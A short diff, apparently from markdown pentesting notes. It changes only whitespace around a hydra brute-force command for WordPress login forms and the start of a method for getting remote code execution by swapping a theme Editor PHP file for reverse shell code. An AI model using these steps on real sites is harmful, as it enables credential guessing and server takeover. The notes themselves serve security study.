@@ -20,8 +20,8 @@ mermaid: true
  ```shell
  hydra -L <username_list> -p <static_pass> <target-ip> http-post-form "/<login_dir>:log=^USER^&pwd=^PASS^:F=<error message>" -t 30
  ```
- 
- ### RCE on WordPpress 
+   
+ ### RCE on WordPpress
  
  1. We need admin acc for accessing Appearance --> **Editor**.
  2. Replance an appropriate, i.e. least used, Editor PHP script with reverse shell code. 
